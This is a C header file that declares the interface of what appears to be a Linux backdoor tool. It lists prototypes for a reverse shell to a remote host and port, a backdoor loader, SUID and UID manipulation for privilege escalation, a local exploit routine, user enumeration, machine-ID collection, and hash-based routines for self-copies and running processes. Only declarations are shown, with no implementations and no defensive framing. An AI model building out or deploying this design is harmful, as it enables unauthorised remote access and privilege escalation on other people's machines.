#ifndef CORE_H
#define CORE_H

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <fcntl.h>
#include <netdb.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <limits.h>
#include <dirent.h>
#include "random_md5.h"

void delete_extra_files_with_hash(const char * hash, bool keep_last);
char * get_current_file_hash(void);
void remove_files_by_hash(const char * hash);
void local_exp(const char * path);
int check_tmp_for_same_hash(const char * hash, char * out_path);
void tmp_proc(const char * path, int id, const char * rhost, int rport);
void list_all_users(void);
char * get_machine_id(void);
void reverse_shell(int uid, const char * rhost, int rport);
void set_uid(int target_uid);
void set_suid(void);
bool has_suid_privileges(void);
int check_script_name_is_md5(void);
int check_local_for_same_hash(const char * hash, char * out_path);
void print_ascii_art(void);
bool is_root(void);
void backdoor_loader(void);
void create_tyrant_script(void);
const char * extract_filename(const char * path);
char * get_file_hash(const char * file_path);
void normal_method(bool backdoor_mode, int target_uid, const char * rhost, int rport);
void check_program_directory(int target_uid, const char * rhost, int rport);
int create_directory_if_needed(const char * dir_path);
int check_running_process_with_hash(const char * hash);

#endif // CORE_H
